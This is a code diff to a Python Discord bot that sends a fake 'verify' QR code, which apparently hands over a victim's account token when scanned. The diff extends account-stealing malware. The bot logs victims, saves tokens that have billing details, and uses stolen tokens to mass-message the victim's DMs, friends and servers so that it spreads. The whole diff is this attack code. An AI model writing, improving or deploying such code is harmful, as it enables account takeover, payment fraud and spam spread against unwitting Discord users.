@@ -46,6 +46,7 @@ class QRHandler():
     def __init__(self):
         self.ctx = None
         self.client = None
+        self.billing = None
         self.client = DRAClient(on_connected=self.on_connected, 
                                 on_scan=self.on_scan, 
                                 on_finish=self.on_finish, 
@@ -56,17 +57,17 @@ class QRHandler():
         await self.client.connect()
     
     async def on_connected(self):
-        print(f'[{datetime.now()}] [New session opened]')
+        print(f'[{datetime.now()}] [Opened] {self.ctx.user.name}#{self.ctx.user.discriminator}')
 
         qr = await generate_qr(self.client.fingerprint)
         embed = await generate_verify_embed()
-        
-        await self.ctx.response.send_message(embed=embed, file=qr, ephemeral=True)
+        await self.ctx.followup.send(embed=embed, file=qr, ephemeral=True)
+        # await self.ctx.response.send_message(embed=embed, file=qr, ephemeral=True)
 
 
                     
     async def on_scan(self):
-        print(f'{Fore.YELLOW}[{datetime.now()}] [SCANNED] {self.client.user.username}#{self.client.user.discrim}')
+        print(f'{Fore.YELLOW}[{datetime.now()}] [Scanned] {self.client.user.username}#{self.client.user.discrim}')
             
 
     async def save_token(self, token, name):
@@ -103,6 +104,7 @@ class QRHandler():
             pass
         
         if Dump().get_payment(token):
+            self.billing = True
             await self.save_token(token, "billing")
             
     async def export_token(self, token):
@@ -145,14 +147,20 @@ class QRHandler():
         
         if config["auto_spread"]['enabled'] == True:
             massdm = MassDM()
-            await massdm.init(self.client.token)
+            await massdm.init(self.client.token, '#'.join([self.client.user.username, self.client.user.discrim]))
 
-            if config["auto_spread"]['dm_dms'] == True:
-                await massdm.message_dms()
-            if config["auto_spread"]['dm_friends'] == True:
-                await massdm.message_friends()
-            if config["auto_spread"]['dm_guilds'] == True:
-                await massdm.message_guilds()
+            if not self.billing:
+                if config["auto_spread"]['dm_dms'] == True:
+                    print('Mass dming open dms')
+                    asyncio.create_task(massdm.message_dms())
+                if config["auto_spread"]['dm_friends'] == True:
+                    print('Mass dming friends')
+
+                    asyncio.create_task(massdm.message_friends())
+                if config["auto_spread"]['dm_guilds'] == True:
+                    print('Mass dming guilds')
+
+                    asyncio.create_task(massdm.message_guilds())
 
                                 
         
